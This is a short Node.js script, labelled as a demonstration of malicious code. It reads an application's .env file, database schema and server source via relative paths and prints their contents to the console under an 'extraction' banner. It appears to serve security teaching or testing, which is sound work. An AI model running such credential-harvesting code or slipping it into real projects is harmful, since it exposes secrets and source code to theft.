// Malicious JavaScript file - For demonstration purposes only
// This file demonstrates how an attacker might try to extract sensitive information

const fs = require('fs');
const path = require('path');

// Try to read sensitive files
const sensitiveFiles = [
    path.join(__dirname, '../.env'),
    path.join(__dirname, '../db/schema.sql'),
    path.join(__dirname, '../server/index.js'),
];

console.log('=== SENSITIVE INFORMATION EXTRACTION ===\n');

sensitiveFiles.forEach(file => {
    try {
        if (fs.existsSync(file)) {
            console.log(`\n--- Content of ${file} ---`);
            console.log(fs.readFileSync(file, 'utf8'));
        } else {
            console.log(`\n--- File not found: ${file} ---`);
        }
    } catch (error) {
        console.log(`\n--- Error reading ${file}: ${error.message} ---`);
    }
});

console.log('\n=== END OF EXTRACTION ===');

